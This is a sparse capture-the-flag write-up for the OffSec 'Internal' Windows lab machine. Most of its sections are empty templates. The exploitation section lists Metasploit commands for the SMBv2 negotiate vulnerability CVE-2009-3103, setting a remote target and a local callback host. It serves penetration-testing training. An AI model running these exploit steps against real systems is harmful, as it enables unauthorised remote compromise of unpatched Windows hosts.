---
title: "Internal"
date: 2026-03-29
draft: false
description: "OffSec Internal writeup"
tags: ["windows", "easy", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Internal

## Overview

- **OS:** Windows
- **IP:** 192.168.222.40
- **Difficulty:** Easy
- **Platform:** OffSec
- **OSCP:** Yes
- **Lists:** N/A

### Summary

simple outdated samba.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames |  |
| Passwords |  |
| Usernames+Passwords |  |
| Hashes |  |
| Service Versions |  |

## Enumeration

## Nmap

```

```

## Dirbusting

```

```

## Port 80

## Exploitation

msfconsole
search cve:CVE-2009-3103
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
set RHOSTS <target-ip>
set LHOST <local-ip>
run
